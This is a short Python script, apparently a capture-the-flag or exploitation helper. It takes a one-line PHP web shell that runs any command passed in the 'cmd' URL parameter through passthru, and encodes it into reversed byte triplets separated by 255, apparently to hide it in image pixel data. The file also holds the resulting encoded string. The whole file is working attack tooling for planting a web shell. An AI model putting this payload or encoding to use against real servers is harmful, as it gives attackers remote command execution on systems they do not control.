'''
phpcode = "<? echo passthru($_GET['cmd']); ?>"

k = 0
arr=[]
minarr=[]
for i in phpcode:
	print (ord(i))
	if k == 3 :
		for t in minarr[::-1]:
			arr.append(t)
		arr.append("255")
		minarr=[]
		k = 0
	if k < 3:
		minarr.append(str(ord(i)))
		k=k+1

print (arr)
print len(arr)

'''

string="'32', '63', '60', '255', '104', '99', '101', '255', '112', '32', '111', '255', '115', '115', '97', '255', '114', '104', '116', '255', '36', '40', '117', '255', '69', '71', '95', '255', '39', '91', '84', '255', '100', '109', '99', '255', '41', '93', '39', '255', '63', '32', '59', '255','62','62','62','255'"


string=string.replace(" ", "")
string=string.replace("'", "")
print string

'''
